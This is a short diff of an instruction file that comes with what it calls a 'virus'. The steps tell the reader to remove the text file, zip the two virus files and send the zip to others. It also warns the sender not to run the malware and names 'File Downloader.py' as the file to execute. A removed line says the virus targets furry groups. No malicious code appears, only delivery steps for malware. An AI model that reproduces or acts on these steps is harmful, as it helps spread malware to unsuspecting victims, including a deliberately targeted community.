@@ -2,8 +2,15 @@ This is a simple virus so no explicit modifications are required.
 =================================================================
 
 Before sending the virus:
-1. remove this file
+1. remove this text file
 2. zip the two virus files
 3. send the zip folder
 
-This virus is tailored towards furry groups and does not need further modifications to attack furrys.
+
+=====================================
+How to run the virus:
+WARNING! It is strictly advised to not run the virus for your own safety.
+
+====================
+Instructions:
+1. Run File Downloader.py
